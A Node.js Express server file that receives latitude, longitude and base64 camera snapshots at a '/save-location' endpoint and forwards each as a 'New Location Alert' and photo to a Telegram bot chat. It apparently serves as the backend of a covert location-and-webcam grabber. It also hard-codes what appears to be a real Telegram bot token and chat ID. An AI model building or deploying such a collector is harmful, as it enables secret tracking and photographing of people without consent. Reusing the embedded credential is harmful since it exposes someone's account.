const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const port = process.env.PORT || 3000;

// Your Telegram token
const TELEGRAM_TOKEN = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
// Replace with your Telegram chat ID
const TELEGRAM_CHAT_ID = '860517021';

app.use(bodyParser.json());

// Endpoint to receive location and snapshot data
app.post('/save-location', async (req, res) => {
    const { latitude, longitude, snapshot } = req.body;

    // Prepare the message to send to Telegram
    const message = `🌍 **New Location Alert:**\nLatitude: ${latitude}\nLongitude: ${longitude}`;

    // Send location message to Telegram
    await sendTelegramMessage(message);

    // If a snapshot is available, send it to Telegram
    if (snapshot && snapshot.startsWith('data:image')) {
        await sendTelegramPhoto(snapshot);
    }

    res.send({ status: 'Data received and sent to Telegram' });
});

// Function to send a text message to Telegram
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
            }),
        });
        console.log('Location sent to Telegram successfully.');
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Function to send an image to Telegram
async function sendTelegramPhoto(snapshot) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;

        // Convert base64 snapshot to Buffer for file upload
        const base64Data = snapshot.replace(/^data:image\/png;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');

        // Send the snapshot to Telegram
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', buffer, {
            filename: 'snapshot.png',
            contentType: 'image/png',
        });

        await fetch(url, {
            method: 'POST',
            body: formData,
        });
        console.log('Snapshot sent to Telegram successfully.');
    } catch (error) {
        console.error('Error sending snapshot to Telegram:', error);
    }
}

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
